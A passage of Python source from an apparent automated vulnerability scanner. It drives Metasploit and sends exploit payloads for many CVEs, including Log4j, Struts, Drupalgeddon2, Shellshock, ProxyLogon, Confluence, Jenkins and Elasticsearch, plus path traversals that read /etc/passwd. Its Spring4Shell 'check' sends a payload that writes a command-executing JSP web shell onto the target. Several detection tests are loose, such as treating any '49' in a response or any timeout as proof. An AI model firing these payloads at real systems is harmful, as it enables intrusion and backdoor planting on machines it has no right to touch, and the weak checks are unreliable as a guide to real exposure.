                        "method": "github_search", "timestamp": datetime.now().isoformat(), "label": label,
                        "github_url": poc["url"], "github_stars": poc["stars"]})
        return results

    def _search_metasploit_by_cve(self, cve):
        if not self._msf_available: return []
        if cve in self._msf_cache: return self._msf_cache[cve]
        log_info(f"[Metasploit] Searching modules for {cve}...")
        try:
            cve_num = cve.replace("CVE-", "")
            cmd = ["msfconsole", "-q", "-n", "-x", f"search cve:{cve_num}; exit"]
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=60, env={**os.environ, "TERM": "dumb"})
            output = strip_ansi(r.stdout) + "\n" + strip_ansi(r.stderr)
            modules = self._parse_msf_search(output)
            self._msf_cache[cve] = modules
            if modules: log_success(f"[Metasploit] Found {len(modules)} modules for {cve}")
            return modules
        except subprocess.TimeoutExpired:
            log_error(f"[Metasploit] Timeout for {cve}"); return []
        except Exception as e:
            log_error(f"[Metasploit] Search error for {cve}: {e}"); return []

    def _parse_msf_search(self, text):
        modules = []; in_table = False
        for line in text.split("\n"):
            line = line.rstrip()
            if not line: continue
            if "Matching Modules" in line: in_table = True; continue
            if not in_table: continue
            if line.strip().startswith("=") or line.strip().startswith("-"): continue
            if "Name" in line and "Disclosure Date" in line: continue
            m = re.match(r"^\s*\d+\s+(\S+)(?:\s+(.*))?$", line)
            if not m: continue
            path = m.group(1)
            if "/" not in path: continue
            rest = m.group(2) or ""
            parts = rest.split()
            date = ""; rank = ""; check = ""; desc = ""
            if parts and re.match(r"\d{4}-\d{2}-\d{2}", parts[0]):
                date = parts[0]; parts = parts[1:]
            if parts: rank = parts[0]; parts = parts[1:]
            if parts and parts[0] in ("Yes", "No"): check = parts[0]; parts = parts[1:]
            desc = " ".join(parts)
            modules.append({"path": path, "date": date, "rank": rank, "check": check, "description": desc})
        return modules

    def _run_metasploit_check(self, target, ip, port, module, label):
        if not self._msf_available: return None
        host = ip or target
        if not host: return None
        module_path = module["path"]
        mod_type = "exploit"
        if "auxiliary/" in module_path: mod_type = "auxiliary"
        elif "post/" in module_path: mod_type = "post"
        if mod_type in ("exploit", "auxiliary") and ("http" in module_path or "scanner" in module_path):
            fp_ok, fp_details = self._msf_sanity_check(host, port, module_path)
            if not fp_ok:
                return {"target": target or ip, "vulnerability": module_path, "type": "metasploit",
                    "status": "not_vulnerable", "details": f"Sanity check failed: {fp_details}",
                    "method": "msf_check", "timestamp": datetime.now().isoformat(), "label": label}
        rc_file = f"/tmp/msf_check_{int(time.time())}_{random.randint(1000,9999)}.rc"
        lines = [f"use {module_path}"]
        if mod_type in ("exploit", "auxiliary"):
            lines.append(f"set RHOSTS {host}")
            if port: lines.append(f"set RPORT {port}")
        lines.append("check"); lines.append("exit")
        try:
            with open(rc_file, "w") as f: f.write("\n".join(lines) + "\n")
            cmd = ["msfconsole", "-q", "-n", "-r", rc_file]
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=120, env={**os.environ, "TERM": "dumb"})
            output = strip_ansi(r.stdout + "\n" + r.stderr)
            if os.path.exists(rc_file): os.remove(rc_file)
            waf_detected = False; waf_name = None
            out_lower = output.lower()
            for wn, sigs in self.waf_signatures.items():
                for sig in sigs:
                    if sig in out_lower: waf_detected = True; waf_name = wn; break
                if waf_detected: break
            if waf_detected:
                return {"target": target or ip, "vulnerability": module_path, "type": "metasploit",
                    "status": "blocked", "details": f"WAF detected during check ({waf_name})",
                    "method": "msf_check", "timestamp": datetime.now().isoformat(), "label": label,
                    "raw_output": output[-500:]}
            status, detail = self._parse_msf_check_output(output)
            return {"target": target or ip, "vulnerability": module_path, "type": "metasploit",
                "status": status, "details": detail, "method": "msf_check",
                "timestamp": datetime.now().isoformat(), "label": label, "raw_output": output[-500:]}
        except subprocess.TimeoutExpired:
            if os.path.exists(rc_file): os.remove(rc_file)
            return {"target": target or ip, "vulnerability": module_path, "type": "metasploit",
                "status": "error", "details": "msfconsole check timed out (120s)", "method": "msf_check",
                "timestamp": datetime.now().isoformat(), "label": label}
        except Exception as e:
            if os.path.exists(rc_file): os.remove(rc_file)
            return {"target": target or ip, "vulnerability": module_path, "type": "metasploit",
                "status": "error", "details": str(e), "method": "msf_check",
                "timestamp": datetime.now().isoformat(), "label": label}

    def _msf_sanity_check(self, host, port, module_path):
        path_lower = module_path.lower()
        checks = {
            "roxy_wi": ["roxy", "roxy-wi"], "glinet": ["glinet", "gl.inet"],
            "nginx_chunked": ["nginx"], "php_fpm": ["php", "php-fpm"],
            "drupal": ["drupal"], "jenkins": ["jenkins"], "confluence": ["confluence"],
            "exchange": ["exchange", "microsoft"], "weblogic": ["weblogic"],
            "gitlab": ["gitlab"], "grafana": ["grafana"], "nexus": ["nexus"],
            "elastic": ["elasticsearch"], "redis": ["redis"],
            "citrix": ["citrix", "netscaler"], "f5": ["f5", "big-ip"],
            "spring": ["spring"], "struts": ["struts"], "log4j": ["log4j"],
            "tomcat": ["tomcat", "apache"], "apache_james": ["apache james", "james"],
            "barracuda": ["barracuda"], "haraka": ["haraka"], "mdaemon": ["mdaemon"],
            "opensmtpd": ["opensmtpd"], "exim": ["exim"], "sendmail": ["sendmail"],
            "qmail": ["qmail"], "squirrelmail": ["squirrelmail"], "freescout": ["freescout"],
            "owncloud": ["owncloud"], "wp_": ["wordpress"], "outlook": ["microsoft", "exchange"],
        }
        required_fp = None
        for key, fps in checks.items():
            if key in path_lower: required_fp = fps; break
        if not required_fp: return True, "No fingerprint requirement"
        scheme = "https"; test_port = port or 443
        if test_port in (80, 8080, 8000, 9000): scheme = "http"
        try:
            url = f"{scheme}://{host}" if test_port in (80, 443) else f"{scheme}://{host}:{test_port}"
            r = self.session.get(url, timeout=10, allow_redirects=False)
            text = (r.text + " " + str(r.headers)).lower()
            fp_found = False
            for fp in required_fp:
                if fp in text: fp_found = True; break
            version_match = False
            server_hdr = r.headers.get("Server", "").lower()
            x_gen = r.headers.get("X-Generator", "").lower()
            for fp in required_fp:
                if fp in server_hdr or fp in x_gen: version_match = True; break
            if not fp_found and not version_match:
                return False, f"Target does not match module fingerprint ({', '.join(required_fp)})"
            return True, "Fingerprint matched"
        except Exception as e:
            return True, f"Could not verify fingerprint: {e}"

    def _parse_msf_check_output(self, output):
        out_lower = output.lower()
        # Приоритет: явный CheckCode из метаплоты (Vulnerable=1, Safe=0,
        # Unsupported/Unknown>1) — он надёжнее текстовых паттернов.
        m = re.search(r"checkcode\s*::?\s*(?:checkcode|)?\s*(vulnerable|safe|unsupported|unknown)\b", out_lower)
        if not m:
            m = re.search(r"check\s*code\s*[:=]?\s*(\d+)", out_lower)
            if m:
                code = m.group(1)
                if code == "1":
                    return "vulnerable", "CheckCode::Vulnerable (target is exploitable)"
                if code == "0":
                    return "not_vulnerable", "CheckCode::Safe (target is not vulnerable)"
                return "unknown", f"CheckCode::{code} (unknown/unsupported)"
        else:
            word = m.group(1)
            if word == "vulnerable":
                return "vulnerable", "CheckCode::Vulnerable (target is exploitable)"
            if word == "safe":
                return "not_vulnerable", "CheckCode::Safe (target is not vulnerable)"
            return "unknown", f"CheckCode::{word.title()}"
        pos_patterns = [
            ("the target is vulnerable", "vulnerable", "Metasploit check confirmed: target IS VULNERABLE"),
            ("target is vulnerable", "vulnerable", "Metasploit check confirmed: target IS VULNERABLE"),
            ("appears to be vulnerable", "vulnerable", "Metasploit check: target APPEARS TO BE VULNERABLE"),
            ("vulnerable!", "vulnerable", "Metasploit check confirmed: target IS VULNERABLE"),
            ("confirmed vulnerable", "vulnerable", "Metasploit check confirmed: target IS VULNERABLE"),
            ("check code: 1", "vulnerable", "Metasploit check returned vulnerable status code"),
        ]
        for pattern, status, detail in pos_patterns:
            if pattern in out_lower: return status, detail
        neg_patterns = [
            ("does not appear to be vulnerable", "not_vulnerable", "Target does not appear to be vulnerable"),
            ("is not vulnerable", "not_vulnerable", "Metasploit check: target is NOT vulnerable"),
            ("not exploitable", "not_vulnerable", "Metasploit check: target is NOT exploitable"),
            ("check code: 0", "not_vulnerable", "Metasploit check returned safe status code"),
            ("check code: 2", "unknown", "Metasploit check returned unknown status code"),
            ("cannot reliably check", "unknown", "Check failed or could not determine"),
            ("check failed", "unknown", "Check failed or could not determine"),
            ("no matching target", "not_vulnerable", "No matching target for this module"),
            ("target did not respond", "unknown", "Target did not respond to check"),
        ]
        for pattern, status, detail in neg_patterns:
            if pattern in out_lower: return status, detail
        if "check" in out_lower and ("completed" in out_lower or "finished" in out_lower):
            if "vulnerable" not in out_lower:
                return "not_vulnerable", "Check completed, no vulnerability indicators found"
        return "unknown", "No clear check result from msfconsole output"

    def _extract_cve_from_string(self, text):
        if not text: return None
        m = re.search(r"CVE-\d{4}-\d+", str(text), re.IGNORECASE)
        return m.group(0).upper() if m else None

    def _extract_cves_from_msf_module(self, mod):
        cves = set()
        text = f"{mod.get('path','')} {mod.get('description','')}"
        for cve in re.findall(r"CVE-\d{4}-\d+", text, re.IGNORECASE): cves.add(cve.upper())
        for m in re.findall(r"cve[_-](\d{4})[_-](\d+)", text, re.IGNORECASE): cves.add(f"CVE-{m[0]}-{m[1]}")
        return list(cves)

    def _check_cve_by_id(self, url, cve, context):
        cve_lower = cve.lower()
        checks = {
            "cve-2021-44228": self.check_log4j, "cve-2017-5638": self.check_struts2,
            "cve-2018-11776": self.check_struts2_2018_11776,
            "cve-2019-19781": self.check_citrix_cve_2019_19781,
            "cve-2020-5902": self.check_f5_cve_2020_5902,
            "cve-2021-26855": self.check_exchange_cve_2021_26855,
            "cve-2018-7600": self.check_drupal_cve_2018_7600,
            "cve-2021-41773": self.check_apache_path_traversal_cve_2021_41773,
            "cve-2021-42013": self.check_apache_path_traversal_cve_2021_42013,
            "cve-2014-0160": self.check_heartbleed, "cve-2014-6271": self.check_shellshock,
            "cve-2022-22965": self.check_spring4shell, "cve-2020-1938": self.check_ghostcat,
            "cve-2021-26084": self.check_confluence_cve_2021_26084,
            "cve-2022-26134": self.check_confluence_cve_2022_26134,
            "cve-2017-1000353": self.check_jenkins_cve_2017_1000353,
            "cve-2018-1000861": self.check_jenkins_cve_2018_1000861,
            "cve-2014-3120": self.check_elasticsearch_cve_2014_3120,
            "cve-2015-1427": self.check_elasticsearch_cve_2015_1427,
            "cve-2022-0543": self.check_redis_cve_2022_0543,
            "cve-2017-10271": self.check_weblogic_cve_2017_10271,
            "cve-2019-7238": self.check_nexus_cve_2019_7238,
            "cve-2021-22205": self.check_gitlab_cve_2021_22205,
            "cve-2021-43798": self.check_grafana_cve_2021_43798,
            "cve-2012-1823": self.check_php_cgi_cve_2012_1823,
        }
        if cve_lower in checks:
            return checks[cve_lower](url, context)
        return {"target": url, "vulnerability": cve, "type": "cve", "status": "unknown",
                "details": "No web-PoC, try Metasploit check", "method": "cve_lookup",
                "timestamp": datetime.now().isoformat()}

    def _safe_request(self, method, url, **kwargs):
        try:
            RATE_LIMITER.wait()
            if method == "get": r = self.session.get(url, timeout=self.timeout, allow_redirects=False, **kwargs)
            elif method == "post": r = self.session.post(url, timeout=self.timeout, allow_redirects=False, **kwargs)
            else: r = self.session.request(method, url, timeout=self.timeout, allow_redirects=False, **kwargs)
            waf = self._detect_waf(r)
            if waf: return None, f"blocked_by_{waf}"
            return r, None
        except requests.exceptions.Timeout: return None, "timeout"
        except Exception as e: return None, str(e)

    def check_log4j(self, url, context=None):
        payloads = ["${jndi:ldap://127.0.0.1#test.com/a}", "${jndi:dns://127.0.0.1#test.com}"]
        headers_to_test = ["User-Agent", "X-Api-Version", "X-Forwarded-For", "Referer"]
        for payload in payloads:
            for header in headers_to_test:
                h = {header: payload, "Connection": "close"}
                r, err = self._safe_request("get", url, headers=h)
                if err and "blocked" in err:
                    return {"target": url, "vulnerability": "CVE-2021-44228", "type": "cve", "status": "blocked",
                        "details": f"WAF blocked test ({err})", "method": "log4j_jndi_test", "timestamp": datetime.now().isoformat()}
                if r and r.status_code in (500, 502, 503, 504):
                    return {"target": url, "vulnerability": "CVE-2021-44228", "type": "cve", "status": "vulnerable",
                        "details": f"Error {r.status_code} with JNDI in {header}", "method": "log4j_jndi_test", "timestamp": datetime.now().isoformat()}
                if err == "timeout":
                    return {"target": url, "vulnerability": "CVE-2021-44228", "type": "cve", "status": "vulnerable",
                        "details": f"Timeout with JNDI in {header} -- possible outbound", "method": "log4j_jndi_test", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2021-44228", "type": "cve", "status": "not_vulnerable",
                "details": "No reaction to JNDI payloads", "method": "log4j_jndi_test", "timestamp": datetime.now().isoformat()}

    def check_struts2(self, url, context=None):
        payload = "%(1234*5678)"
        headers = {"Content-Type": f"multipart/form-data; boundary={payload}"}
        r, err = self._safe_request("get", url, headers=headers)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2017-5638", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "struts2_ognl_test", "timestamp": datetime.now().isoformat()}
        if r and "7006652" in r.text:
            return {"target": url, "vulnerability": "CVE-2017-5638", "type": "cve", "status": "vulnerable",
                "details": "OGNL evaluated (1234*5678=7006652)", "method": "struts2_ognl_test", "timestamp": datetime.now().isoformat()}
        r2, err2 = self._safe_request("post", url, headers=headers, data="test")
        if r2 and "7006652" in r2.text:
            return {"target": url, "vulnerability": "CVE-2017-5638", "type": "cve", "status": "vulnerable",
                "details": "OGNL evaluated via POST", "method": "struts2_ognl_test", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2017-5638", "type": "cve", "status": "not_vulnerable",
                "details": "OGNL not evaluated", "method": "struts2_ognl_test", "timestamp": datetime.now().isoformat()}

    def check_struts2_2018_11776(self, url, context=None):
        payload = "${(1234*5678)}"
        r, err = self._safe_request("get", url + "/" + payload)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2018-11776", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "struts2_url_ognl", "timestamp": datetime.now().isoformat()}
        if r and "7006652" in r.text:
            return {"target": url, "vulnerability": "CVE-2018-11776", "type": "cve", "status": "vulnerable",
                "details": "OGNL evaluated in URL path", "method": "struts2_url_ognl", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2018-11776", "type": "cve", "status": "not_vulnerable",
                "details": "No OGNL evaluation", "method": "struts2_url_ognl", "timestamp": datetime.now().isoformat()}

    def check_citrix_cve_2019_19781(self, url, context=None):
        check_url = url.rstrip("/") + "/vpn/../vpns/cfg/smb.conf"
        r, err = self._safe_request("get", check_url)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2019-19781", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "citrix_path_traversal", "timestamp": datetime.now().isoformat()}
        if r and r.status_code == 200 and "[global]" in r.text:
            return {"target": url, "vulnerability": "CVE-2019-19781", "type": "cve", "status": "vulnerable",
                "details": "smb.conf accessible via traversal", "method": "citrix_path_traversal", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2019-19781", "type": "cve", "status": "not_vulnerable",
                "details": f"Response: {r.status_code if r else 'error'}", "method": "citrix_path_traversal", "timestamp": datetime.now().isoformat()}

    def check_f5_cve_2020_5902(self, url, context=None):
        check_url = url.rstrip("/") + "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
        r, err = self._safe_request("get", check_url)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2020-5902", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "f5_tmui_traversal", "timestamp": datetime.now().isoformat()}
        if r and r.status_code == 200 and "root:" in r.text:
            return {"target": url, "vulnerability": "CVE-2020-5902", "type": "cve", "status": "vulnerable",
                "details": "Read /etc/passwd via TMUI traversal", "method": "f5_tmui_traversal", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2020-5902", "type": "cve", "status": "not_vulnerable",
                "details": f"Response: {r.status_code if r else 'error'}", "method": "f5_tmui_traversal", "timestamp": datetime.now().isoformat()}

    def check_exchange_cve_2021_26855(self, url, context=None):
        check_url = url.rstrip("/") + "/owa/auth.owa"
        headers = {"Cookie": "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;",
                   "Content-Type": "application/x-www-form-urlencoded"}
        r, err = self._safe_request("post", check_url, headers=headers, data="test=1")
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2021-26855", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "exchange_proxylogon_ssrf", "timestamp": datetime.now().isoformat()}
        if r and r.status_code == 302 and "/ecp/" in r.headers.get("Location", ""):
            return {"target": url, "vulnerability": "CVE-2021-26855", "type": "cve", "status": "vulnerable",
                "details": "SSRF redirect to /ecp/ confirmed", "method": "exchange_proxylogon_ssrf", "timestamp": datetime.now().isoformat()}
        check_url2 = url.rstrip("/") + "/ecp/y.js"
        headers2 = {"Cookie": "X-BEResource=localhost/owa/auth/logon.aspx?~3;"}
        r2, err2 = self._safe_request("get", check_url2, headers=headers2)
        if r2 and r2.status_code == 500 and "NegotiateSecurityContext" in r2.text:
            return {"target": url, "vulnerability": "CVE-2021-26855", "type": "cve", "status": "vulnerable",
                "details": "Backend SSRF triggered (NegotiateSecurityContext)", "method": "exchange_proxylogon_ssrf", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2021-26855", "type": "cve", "status": "not_vulnerable",
                "details": f"Response: {r.status_code if r else 'error'}", "method": "exchange_proxylogon_ssrf", "timestamp": datetime.now().isoformat()}

    def check_drupal_cve_2018_7600(self, url, context=None):
        check_url = url.rstrip("/") + "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
        data = "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=printf&mail[#type]=markup&mail[#markup]=DRUPALGEDDON123"
        r, err = self._safe_request("post", check_url, data=data)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2018-7600", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "drupalgeddon2_test", "timestamp": datetime.now().isoformat()}
        if r and "DRUPALGEDDON123" in r.text:
            return {"target": url, "vulnerability": "CVE-2018-7600", "type": "cve", "status": "vulnerable",
                "details": "RCE via form API confirmed", "method": "drupalgeddon2_test", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2018-7600", "type": "cve", "status": "not_vulnerable",
                "details": f"Response: {r.status_code if r else 'error'}", "method": "drupalgeddon2_test", "timestamp": datetime.now().isoformat()}

    def check_apache_path_traversal_cve_2021_41773(self, url, context=None):
        check_url = url.rstrip("/") + "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
        r, err = self._safe_request("get", check_url)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2021-41773", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "apache_path_traversal", "timestamp": datetime.now().isoformat()}
        if r and r.status_code == 200 and "root:" in r.text:
            return {"target": url, "vulnerability": "CVE-2021-41773", "type": "cve", "status": "vulnerable",
                "details": "Read /etc/passwd via traversal", "method": "apache_path_traversal", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2021-41773", "type": "cve", "status": "not_vulnerable",
                "details": f"Response: {r.status_code if r else 'error'}", "method": "apache_path_traversal", "timestamp": datetime.now().isoformat()}

    def check_apache_path_traversal_cve_2021_42013(self, url, context=None):
        check_url = url.rstrip("/") + "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
        r, err = self._safe_request("get", check_url)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2021-42013", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "apache_path_traversal2", "timestamp": datetime.now().isoformat()}
        if r and r.status_code == 200 and "root:" in r.text:
            return {"target": url, "vulnerability": "CVE-2021-42013", "type": "cve", "status": "vulnerable",
                "details": "Read /etc/passwd via double-encoded traversal", "method": "apache_path_traversal2", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2021-42013", "type": "cve", "status": "not_vulnerable",
                "details": f"Response: {r.status_code if r else 'error'}", "method": "apache_path_traversal2", "timestamp": datetime.now().isoformat()}

    def check_heartbleed(self, url, context=None):
        host = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
        port = 443
        if context and "port" in context: port = int(context["port"])
        try:
            cmd = ["nmap", "-p", str(port), "--script", "ssl-heartbleed", host, "-oX", "-"]
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if "VULNERABLE" in r.stdout and "Heartbleed" in r.stdout:
                return {"target": host, "vulnerability": "CVE-2014-0160", "type": "cve", "status": "vulnerable",
                        "details": f"Heartbleed on port {port}", "method": "nmap_ssl_heartbleed", "timestamp": datetime.now().isoformat()}
            elif "NOT VULNERABLE" in r.stdout:
                return {"target": host, "vulnerability": "CVE-2014-0160", "type": "cve", "status": "not_vulnerable",
                        "details": f"Port {port} not vulnerable", "method": "nmap_ssl_heartbleed", "timestamp": datetime.now().isoformat()}
            return {"target": host, "vulnerability": "CVE-2014-0160", "type": "cve", "status": "unknown",
                    "details": "Could not determine", "method": "nmap_ssl_heartbleed", "timestamp": datetime.now().isoformat()}
        except Exception as e:
            return {"target": host, "vulnerability": "CVE-2014-0160", "type": "cve", "status": "error",
                    "details": str(e), "method": "nmap_ssl_heartbleed", "timestamp": datetime.now().isoformat()}

    def check_shellshock(self, url, context=None):
        headers = {"User-Agent": "() { :; }; echo; echo \"SHELLSHOCKED\"", "Referer": "() { :; }; echo; echo \"SHELLSHOCKED\""}
        r, err = self._safe_request("get", url, headers=headers)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2014-6271", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "shellshock_test", "timestamp": datetime.now().isoformat()}
        if r and "SHELLSHOCKED" in r.text:
            return {"target": url, "vulnerability": "CVE-2014-6271", "type": "cve", "status": "vulnerable",
                "details": "Bash env injection confirmed", "method": "shellshock_test", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2014-6271", "type": "cve", "status": "not_vulnerable",
                "details": f"Response: {r.status_code if r else 'error'}", "method": "shellshock_test", "timestamp": datetime.now().isoformat()}

    def check_spring4shell(self, url, context=None):
        check_url = url.rstrip("/") + "/?class.module.classLoader.resources.context.parent.pipeline.firstPattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bs1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bs2%7Di&class.module.classLoader.resources.context.parent.pipeline.firstSuffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.firstDirectory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.firstPrefix=spring4shelltest&class.module.classLoader.resources.context.parent.pipeline.firstFileDateFormat="
        r, err = self._safe_request("get", check_url)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2022-22965", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "spring4shell_test", "timestamp": datetime.now().isoformat()}
        if r and r.status_code == 200 and "class.module.classLoader" not in r.text:
            return {"target": url, "vulnerability": "CVE-2022-22965", "type": "cve", "status": "vulnerable",
                "details": "Spring4Shell payload accepted", "method": "spring4shell_test", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2022-22965", "type": "cve", "status": "not_vulnerable",
                "details": f"Response: {r.status_code if r else 'error'}", "method": "spring4shell_test", "timestamp": datetime.now().isoformat()}

    def check_ghostcat(self, url, context=None):
        host = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, 8009))
            s.close()
            return {"target": host, "vulnerability": "CVE-2020-1938", "type": "cve", "status": "vulnerable",
                "details": "AJP port 8009 open -- Ghostcat possible", "method": "ghostcat_ajp_port", "timestamp": datetime.now().isoformat()}
        except (socket.timeout, ConnectionRefusedError, OSError):
            return {"target": host, "vulnerability": "CVE-2020-1938", "type": "cve", "status": "not_vulnerable",
                "details": "AJP port 8009 closed", "method": "ghostcat_ajp_port", "timestamp": datetime.now().isoformat()}
        except Exception as e:
            return {"target": host, "vulnerability": "CVE-2020-1938", "type": "cve", "status": "error",
                "details": str(e), "method": "ghostcat_ajp_port", "timestamp": datetime.now().isoformat()}

    def check_confluence_cve_2021_26084(self, url, context=None):
        check_url = url.rstrip("/") + "/pages/doenterpagevariables.action"
        data = "queryString=\u0027%2b#{7*7}\u0027"
        r, err = self._safe_request("post", check_url, data=data)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2021-26084", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "confluence_ognl_test", "timestamp": datetime.now().isoformat()}
        if r and "49" in r.text:
            return {"target": url, "vulnerability": "CVE-2021-26084", "type": "cve", "status": "vulnerable",
                "details": "OGNL evaluated (7*7=49) in Confluence", "method": "confluence_ognl_test", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2021-26084", "type": "cve", "status": "not_vulnerable",
                "details": f"Response: {r.status_code if r else 'error'}", "method": "confluence_ognl_test", "timestamp": datetime.now().isoformat()}

    def check_confluence_cve_2022_26134(self, url, context=None):
        check_url = url.rstrip("/") + "/${7*7}/"
        r, err = self._safe_request("get", check_url)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2022-26134", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "confluence_ognl_rce", "timestamp": datetime.now().isoformat()}
        if r and r.status_code == 200 and "49" in r.text:
            return {"target": url, "vulnerability": "CVE-2022-26134", "type": "cve", "status": "vulnerable",
                "details": "OGNL RCE in URL path confirmed (7*7=49)", "method": "confluence_ognl_rce", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2022-26134", "type": "cve", "status": "not_vulnerable",
                "details": f"Response: {r.status_code if r else 'error'}", "method": "confluence_ognl_rce", "timestamp": datetime.now().isoformat()}

    def check_jenkins_cve_2017_1000353(self, url, context=None):
        check_url = url.rstrip("/") + "/securityRealm/user/admin/"
        r, err = self._safe_request("get", check_url)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2017-1000353", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "jenkins_cli_check", "timestamp": datetime.now().isoformat()}
        if r and r.status_code == 200 and "Jenkins" in r.text:
            cli_url = url.rstrip("/") + "/cli"
            r2, err2 = self._safe_request("get", cli_url)
            if r2 and r2.status_code == 200:
                return {"target": url, "vulnerability": "CVE-2017-1000353", "type": "cve", "status": "vulnerable",
                    "details": "Jenkins CLI accessible -- deserialization possible", "method": "jenkins_cli_check", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2017-1000353", "type": "cve", "status": "not_vulnerable",
                "details": "Jenkins CLI not accessible", "method": "jenkins_cli_check", "timestamp": datetime.now().isoformat()}

    def check_jenkins_cve_2018_1000861(self, url, context=None):
        check_url = url.rstrip("/") + "/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=7*7"
        r, err = self._safe_request("get", check_url)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2018-1000861", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "jenkins_groovy_check", "timestamp": datetime.now().isoformat()}
        if r and r.status_code == 200 and "49" in r.text:
            return {"target": url, "vulnerability": "CVE-2018-1000861", "type": "cve", "status": "vulnerable",
                "details": "Groovy sandbox bypass confirmed (7*7=49)", "method": "jenkins_groovy_check", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2018-1000861", "type": "cve", "status": "not_vulnerable",
                "details": f"Response: {r.status_code if r else 'error'}", "method": "jenkins_groovy_check", "timestamp": datetime.now().isoformat()}

    def check_elasticsearch_cve_2014_3120(self, url, context=None):
        check_url = url.rstrip("/") + "/_search?pretty"
        payload = '{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exploit":{"script":"7*7"}}}'
        r, err = self._safe_request("post", check_url, data=payload)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2014-3120", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "elasticsearch_script_rce", "timestamp": datetime.now().isoformat()}
        if r and r.status_code == 200 and "49" in r.text:
            return {"target": url, "vulnerability": "CVE-2014-3120", "type": "cve", "status": "vulnerable",
                "details": "Script RCE confirmed (7*7=49)", "method": "elasticsearch_script_rce", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2014-3120", "type": "cve", "status": "not_vulnerable",
                "details": f"Response: {r.status_code if r else 'error'}", "method": "elasticsearch_script_rce", "timestamp": datetime.now().isoformat()}

    def check_elasticsearch_cve_2015_1427(self, url, context=None):
        check_url = url.rstrip("/") + "/_search?pretty"
        payload = '{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exploit":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}'
        r, err = self._safe_request("post", check_url, data=payload)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2015-1427", "type": "cve", "status": "blocked",
